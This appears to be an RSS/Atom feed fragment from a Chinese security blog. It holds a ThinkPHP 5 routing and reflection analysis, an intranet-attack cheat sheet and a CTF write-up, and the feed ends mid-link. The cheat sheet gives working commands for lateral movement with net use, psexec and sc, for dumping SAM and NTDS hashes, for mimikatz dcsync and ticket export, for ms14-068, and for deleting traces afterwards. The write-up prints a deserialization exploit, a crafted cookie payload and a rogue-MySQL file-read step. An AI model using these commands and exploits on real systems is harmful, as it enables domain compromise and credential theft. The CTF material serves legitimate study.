class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);</span><br></pre></td></tr></table></figure><p>这部分就是通过请求URL来调用相关方法的部分，主要通过php的反射来实现。前半部分主要通过ReflectionMethod获得了action名，最后是通过<code>return self::invokeMethod($call, $vars);</code>调用了相应的方法。跟进invokeMethod看一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span><span class="params">($method, $vars = [])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($method)) &#123;</span><br><span class="line">        $class   = is_object($method[<span class="number">0</span>]) ? $method[<span class="number">0</span>] : <span class="keyword">self</span>::invokeClass($method[<span class="number">0</span>]);</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($class, $method[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 静态方法</span></span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $args = <span class="keyword">self</span>::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">self</span>::$debug &amp;&amp; Log::record(<span class="string">'[ RUN ] '</span> . $reflect-&gt;class . <span class="string">'-&gt;'</span> . $reflect-&gt;name . <span class="string">'[ '</span> . $reflect-&gt;getFileName() . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs(<span class="keyword">isset</span>($class) ? $class : <span class="keyword">null</span>, $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过is_object判断method[0]是否是对象，然后通过<code>new \ReflectionMethod</code>来获得一个反射对象，接下来通过bindParams获得改反射对象要调用的方法的参数，最后通过invokeArgs方法来调用。接下来return给module，module再返回给exec，exec又返回到run的data属性。这一步步的反射操作tql。。</p><p>绕了一大圈，继续再回到run。<br>可以看到，data的确是index控制器index操作返回的值，即index页面的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-55b16bd4316a9477.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>run中接下来会检测data属性是否是Responce类的实例，然而这里data是string，很明显不是，所以要通过<code>$response = Response::create($data, $type);</code>处理一下，使其变成Responce对象，然后就结束run方法，return到start.php中。</p><p>start通过App::run()-&gt;send()来调用返回的Responce对象的send方法，其实核心就是一个echo $data的操作，来将返回输出到页面，这样就完成了一次请求的整个过程。</p><hr><p>再补充一下TP中的自动加载的实现。在base.php中<code>\think\Loader::register();</code>后，就可以进行自动加载了。<br>先进去看下register方法，核心是这几句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自动加载常规操作</span></span><br><span class="line">spl_autoload_register($autoload ?: <span class="string">'think\\Loader::autoload'</span>, <span class="keyword">true</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="comment">// 注册命名空间定义</span></span><br><span class="line"><span class="keyword">self</span>::addNamespace([</span><br><span class="line">    <span class="string">'think'</span>    =&gt; LIB_PATH . <span class="string">'think'</span> . DS,</span><br><span class="line">    <span class="string">'behavior'</span> =&gt; LIB_PATH . <span class="string">'behavior'</span> . DS,</span><br><span class="line">    <span class="string">'traits'</span>   =&gt; LIB_PATH . <span class="string">'traits'</span> . DS,</span><br><span class="line">]);</span><br><span class="line"><span class="comment">// 加载类库映射文件</span></span><br><span class="line"><span class="keyword">if</span> (is_file(RUNTIME_PATH . <span class="string">'classmap'</span> . EXT)) &#123;</span><br><span class="line">    <span class="keyword">self</span>::addClassMap(__include_file(RUNTIME_PATH . <span class="string">'classmap'</span> . EXT));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说，在Loader::controller()方法中，当new $class()的时候，会自动触发自动加载，而路由的解析过程中，只是进行了很多过程操作。而反射是在注入一个对象的过程中，可能这个对象的参数也是一个对象，这就用到了另外的一个对象，这时通过反射和自动加载实现的依赖注入就可以成功new出依赖的实例来注入到参数中，从而实现依赖注入。</p><p>再写一下tp中常用的几个反射方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 执行函数或者闭包方法 支持参数调用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array|\Closure $function 调用的函数名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array                 $vars     函数参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span><span class="params">($function, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $reflect = <span class="keyword">new</span> \ReflectionFunction($function);   <span class="comment">//创建$function的反射函数类</span></span><br><span class="line">    $args    = <span class="keyword">self</span>::bindParams($reflect, $vars);    <span class="comment">//绑定反射函数的参数</span></span><br><span class="line">    <span class="comment">// 记录执行信息</span></span><br><span class="line">    <span class="keyword">self</span>::$debug &amp;&amp; Log::record(<span class="string">'[ RUN ] '</span> . $reflect-&gt;__toString(), <span class="string">'info'</span>);</span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs($args);              <span class="comment">//使用反射函数类调用函数，并返回结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>还有就是依赖注入的概念也是很常用的，在很多框架中，依赖注入都是实现高级功能的基础。我理解得也不是很清晰，这里不详述。</p><h3 id="核心路由调度部分还差很多，未完待续。。。"><a href="#核心路由调度部分还差很多，未完待续。。。" class="headerlink" title="核心路由调度部分还差很多，未完待续。。。"></a>核心路由调度部分还差很多，未完待续。。。</h3><p>参考资料：<br><a href="https://www.kancloud.cn/zmwtp/tp5/" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近TP爆了三个的RCE，我也对漏洞进行了分析，跟了相应的源码。这几个洞一个是任意方法调用造成的，另一个本质是请求中&lt;code&gt;filter&lt;/code&gt;可控，而tp的会对输入即input进行&lt;code&gt;filter&lt;/code&gt;过滤造成的。分析洞不难，但是分析中我对TP的dispatch路由调度以及TP的整个运行过程并不是很清楚，因此就有了这篇文章。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TP版本：5.0.22&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从官网Down到TP源码，首先看start.php里这一句：App::run()-&amp;gt;send(); 跟进App类的run方法&lt;/p&gt;
&lt;p&gt;首先&lt;code&gt;$request&lt;/code&gt;是一个&lt;code&gt;Request::instance()&lt;/code&gt;，进去看一下最后就是&lt;code&gt;self::$instance = new static($options);&lt;/code&gt;这个操作，也就是返回了Request类的实例。&lt;/p&gt;
&lt;p&gt;说下new static这个操作也是第一次见。。之前只见过new self()，这里贴一段代码就明白两者区别了。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;A&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get_self&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;self&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get_static&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;A&lt;/span&gt; &lt;/span&gt;&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; get_class(B::get_self()); &lt;span class=&quot;comment&quot;&gt;// A&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; get_class(B::get_static()); &lt;span class=&quot;comment&quot;&gt;// B&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; get_class(A::get_static()); &lt;span class=&quot;comment&quot;&gt;// A&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://love-sg.me/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>内网tips持续更新</title>
    <link href="http://love-sg.me/2019/02/17/%E5%86%85%E7%BD%91tips%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"/>
    <id>http://love-sg.me/2019/02/17/内网tips持续更新/</id>
    <published>2019-02-17T14:59:45.000Z</published>
    <updated>2019-04-25T15:06:20.024Z</updated>
    
    <content type="html"><![CDATA[<p>net use常见套路:<br>net use \ip\c$ pwd /user:administrator              //建立ipc$<br>net use                                                           //查看ipc$共享<br>copy PsExec.exe \192.168.137.133\c$              //拷到C盘<br>copy PsExec.exe \192.168.137.133\admin$      //通常是C:/Windows<br>net use z: \del                                                 //删除<br>net use S: \ip\c$ pwd /user:administrator                    //映射到本地Span</p><a id="more"></a><p>psexec：<br>psexec.exe \ip –accepteula \域名 -u username -p password cmd.exe</p><p>-c &lt;[路径]文件名&gt;:拷贝文件到远程机器并运行（注意：运行结束后文件会自动删除）<br>-d 不等待程序执行完就返回<br>比如想上传一个本地的getpass到你远程连接的服务器上去:<br>Psexec.exe \ip –u user –p pass –c c:\getpass.exe –d</p><p>常见错误：<br>错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；<br>错误号51，Windows无法找到网络路径：网络有问题；<br>错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙(端口过滤)；at的话可能未开TaskSchedule<br>错误号67，找不到网络名： 判断目标主机已禁用ADMIN$共享<br>错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连；<br>错误号1326，未知的用户名或错误密码；<br>错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动；<br>错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</p><p>win10 at命令没了，但在建立ipc的主机上仍然能成功创建<br>at \IP 23:30 \IP\C$\1.exe                      //执行C盘1.exe</p><h3 id="NTDS-dit"><a href="#NTDS-dit" class="headerlink" title="NTDS.dit:"></a>NTDS.dit:</h3><p>reg save命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hiv</span><br><span class="line">reg save hklm\system system.hiv</span><br><span class="line">reg save hklm\security security.hiv</span><br></pre></td></tr></table></figure></p><p>secretsdump.py:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python secretsdump.py -ntds c:\ntds.dit -system c:\system.hiv LOCAL</span><br></pre></td></tr></table></figure></p><p>QuarkPwDump.exe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarkPwDump.exe --dump-hash-domain --with-history --ntds-file c:\ntds.dit --system-file c:\system.hiv</span><br></pre></td></tr></table></figure></p><p>实战中hash导出流程(转自l3mon师傅)</p><p>1.建立ipc\$连接 <code>net use \\DC1\c\$ password /user:username</code> 2.复制文件到DC <code>copy .\* \\DC1\windows\tasks</code> 3.sc建立远程服务启动程序 <code>sc \\DC1 create backupntds binPath= &quot;cmd /c start c:\windows\tasks\shadowcopy.bat&quot; type= share start= auto error= ignore DisplayName= BackupNTDS</code> 4.启动服务 <code>sc \\DC1 start backupntds</code> 5.删除服务 <code>sc \\DC1 delete backupntds</code> 6.讲hash转移到本地 <code>move \\DC1\c\$\windows\tasks\hash.txt .</code> 7.删除记录文件 <code>del \\DC1\c\$\windows\tasks\ntds.dit \\DC1\c\$\windows\tasks\QuarksPwDump.exe \\DC1\c\$\windows\tasks\shadowcopy.bat \\DC1\c$\windows\tasks\vshadow.exe</code></p><p>Kerberos：<br>krbtgt可通过拿下域控来获得：lsadump::dcsync /domain:域名 /user:krbtgt<br>通过DRSR来获得所有用户hash：lsadump::dcsync /domain:域名 /user:用户名<br>导出：sekurlsa::tickets /export</p><p>查询域用户对域成员机器关系:<br>当控制一台域成员计算机，运行cmd时存在三种用户权限情况：域用户，本地用户，SYSTEM用户。用whoami可以区分三种情况，域用户输出结果是domain\username，本地用户是hostname\username，SYSTEM输出是ntauthority\system。在这三种情况中，本地用户是无法运行之前说的所有命令的，因为本质上所有查询都是通过ldap协议去域控制器上查询，这个查询需要经过权限认证，只有域用户才有这个权限。当域用户运行查询命令时，会自动使用kerberos协议认证，无需额外输入账号密码。SYSTEM用户的情况比较特殊，在域中，除了普通用户外，所有机器都有一个机器用户，用户名是机器名后加$，本质上机器上的SYSTEM用户对应的就是域里面的机器用户，所以SYSTEM权限是可以运行之前说的查询命令的。</p><p>ms14-068找sid方法：<br>域用户：whoami /user<br>本地账户：dsquery user –s 192.168.1.111 –u userName –p passWord –name admin* | dsget user –s 192.168.1.111 –u userName –p passWord –sid<br>ms14-068.py -u userName@域名 -s SID -d 192.168.1.111 -p passWord </p><p>cmd/regedit/taskmgr绕过禁用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;net use常见套路:&lt;br&gt;net use \ip\c$ pwd /user:administrator              //建立ipc$&lt;br&gt;net use                                                           //查看ipc$共享&lt;br&gt;copy PsExec.exe \192.168.137.133\c$              //拷到C盘&lt;br&gt;copy PsExec.exe \192.168.137.133\admin$      //通常是C:/Windows&lt;br&gt;net use z: \del                                                 //删除&lt;br&gt;net use S: \ip\c$ pwd /user:administrator                    //映射到本地Span&lt;/p&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="http://love-sg.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>记一道有意思的TP题</title>
    <link href="http://love-sg.me/2019/01/31/%E8%AE%B0%E4%B8%80%E9%81%93%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84TP%E9%A2%98/"/>
    <id>http://love-sg.me/2019/01/31/记一道有意思的TP题/</id>
    <published>2019-01-31T09:53:08.000Z</published>
    <updated>2019-04-25T15:04:12.329Z</updated>
    
    <content type="html"><![CDATA[<p>kun神推荐了一个不错的tp题，正巧最近看了一段时间tp，就去看了下。</p><p>题目地址：<a href="https://github.com/wonderkun/CTF_web/tree/master/web400-13" target="_blank" rel="noopener">kun神CTF_WEB-400-13</a></p><h3 id="STEP1-任意文件删除"><a href="#STEP1-任意文件删除" class="headerlink" title="STEP1 任意文件删除"></a>STEP1 任意文件删除</h3><p><strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong></p><p>读了一下，发现逻辑很简单，也没啥可能出漏洞的地方，题目要求是读<code>/etc/flag</code>，所以大致有以下几种想法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 能否反序列化来任意文件读取或getshell</span><br><span class="line">2. mysql的地址是可控的，能否删除lock重装来连接远程数据库任意文件读</span><br></pre></td></tr></table></figure></p><p>先来尝试下第一个想法，看看能不能找到TP中的魔术方法中能进行敏感操作的类。</p><p><code>grep -l &#39;c&#39; $(grep -l &#39;b&#39; $(grep -Rl &#39;a&#39; 2&gt;/dev/null))</code> 这样能方便的找某个文件中有某几个关键字</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-9b16cbbfc3eb7588.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>找到一个，用他的remove方法<br><a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>看下反序列化的点，非常明显，info可以由经过和key进行简单运算得到。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSessionUser</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $info = decode(\think\Cookie::get(<span class="string">'info'</span>));</span><br><span class="line">    <span class="keyword">if</span>(is_array($info) &amp;&amp; <span class="keyword">isset</span>($info[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($info[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $user = \think\Db::name(<span class="string">'users'</span>)</span><br><span class="line">            -&gt;where(<span class="string">'username'</span>,<span class="string">'='</span>,$info[<span class="string">'username'</span>])</span><br><span class="line">            -&gt;where(<span class="string">'password'</span>,<span class="string">'='</span>,$info[<span class="string">'password'</span>])</span><br><span class="line">            -&gt;find();</span><br><span class="line">        \think\Session::set(<span class="string">'privilege'</span>,$user[<span class="string">'id'</span>]);</span><br><span class="line">        \think\Session::set(<span class="string">'username'</span>,$user[<span class="string">'username'</span>]);</span><br><span class="line">        \think\Cookie::set(<span class="string">'info'</span>,encode($user));</span><br><span class="line">        <span class="keyword">return</span> $user[<span class="string">'id'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>($info);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = CS;</span><br><span class="line">    $info = urldecode($info);</span><br><span class="line">    $kl = strlen($key);</span><br><span class="line">    $il = strlen($info);</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $il; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $p = $i%$kl;</span><br><span class="line">        $info[$i] = chr(ord($info[$i])-ord($key[$p]));</span><br><span class="line">    &#125;</span><br><span class="line">    $info = unserialize($info);</span><br><span class="line">    <span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>构造下反序列化exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">define(&apos;CS&apos;,md5(base64_encode(&apos;139.199.203.253:8888&apos;)));</span><br><span class="line"></span><br><span class="line">abstract class Pipes&#123;&#125;</span><br><span class="line"></span><br><span class="line">class Windows extends Pipes&#123;</span><br><span class="line">private $files = [&apos;./public/install.lock&apos;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Windows();</span><br><span class="line"></span><br><span class="line">function encode($info)</span><br><span class="line">&#123;</span><br><span class="line">$info = serialize($info);</span><br><span class="line">$key = CS;</span><br><span class="line">$kl = strlen($key);</span><br><span class="line">$il = strlen($info);</span><br><span class="line">for($i = 0; $i &lt; $il; $i++)</span><br><span class="line">&#123;</span><br><span class="line">$p = $i%$kl;</span><br><span class="line">$info[$i] = chr(ord($info[$i])+ord($key[$p]));</span><br><span class="line">&#125;</span><br><span class="line">echo urlencode($info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">encode($a);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发包,注意触发getSessionUser的条件是session中没有获取不到你的privilege，所以要不带sessionid请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/index/login HTTP/1.1</span><br><span class="line">Host: 139.199.203.253:8888</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://139.199.203.253:8888/index.php/index/login.html</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: info=%80%A0%94%9Cq%87%DA%9C%A1%A3%D1%95%A9%D5%A5%93%C6%A3%A5%91%A9%9F%A1%C7%D6%92%BD%9F%A2%C8%A3%A9%A4%88%9C%96q%E0%D9nki%A0%5B9%D7%9E%99%CF%9B%8E%A5%AB%A5%94%C7%D6%A9%C2%A6%9D%D4%99%A5%8D%BD%CB%D3%9B%D4%DD%A78%9B%CF%A5%9E%D6Xk%C2jco%B4%9Fk%92%9E%A9%A0he%9EV%60%60%D6%D7%C7%A3%CE%C9c%A1%A3%D9%AD%9A%CF%A2%5E%CD%9F%95%A0%5Bq%AE%DF</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8400344-7d49294ea0dbf5c6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><h3 id="STEP2-mysql本地文件读取"><a href="#STEP2-mysql本地文件读取" class="headerlink" title="STEP2 mysql本地文件读取"></a>STEP2 mysql本地文件读取</h3><p>重装时，看下地址可控，想到之前突然火起来的老洞–mysql本地文件读取，phpmyadmin也有这个漏洞。</p><p><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a> 起一个mysql，注意题目中mysqli_connect函数并未传入端口，所以必须用3306，python脚本可行，php的不行，不知为啥。。</p><p><img src="https://upload-images.jianshu.io/upload_images/8400344-a357c4e83310d653.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p><p>参考链接：<br><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a><br><a href="https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/" target="_blank" 